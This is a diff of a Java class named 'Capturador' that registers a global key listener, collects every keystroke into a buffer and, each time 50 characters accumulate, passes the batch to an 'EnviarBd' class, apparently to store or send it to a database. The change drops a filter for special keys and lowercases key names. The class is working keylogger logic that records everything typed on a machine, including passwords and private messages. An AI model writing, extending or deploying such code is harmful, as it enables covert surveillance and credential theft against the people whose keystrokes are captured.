@@ -9,47 +9,20 @@ public class Capturador implements NativeKeyListener {
     private int i = 0;
     public static final int numeroDeCaracteresASerEnviado = 50;
 
-    public static final String[] ESPECIAIS = {
-            "backspace",
-            "up",
-            "down",
-            "right",
-            "left",
-            "tab",
-            "enter",
-            "esc",
-            "comma",
-            "shift",
-            "quote",
-            "alt",
-            "back",
-            "ctrl",
-            "quoteback"
-    };
-
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
 
-        var letra = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
-
-        for(var daVez:ESPECIAIS){
-            if(daVez.equals(letra)){
-                letra = letra.replace(letra,"_");
-            }
-        }
-
-        if ("space".equals(letra)) {
-            letra = " ";
-        }
+        var letra = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).toLowerCase();
         aSerEnviado += letra;
-
         i++;
         if(i >= numeroDeCaracteresASerEnviado){
             new EnviarBd(aSerEnviado);
             aSerEnviado = " ";
             i = 0;
         }
-    } @Override
+    }
+
+    @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
     }
 
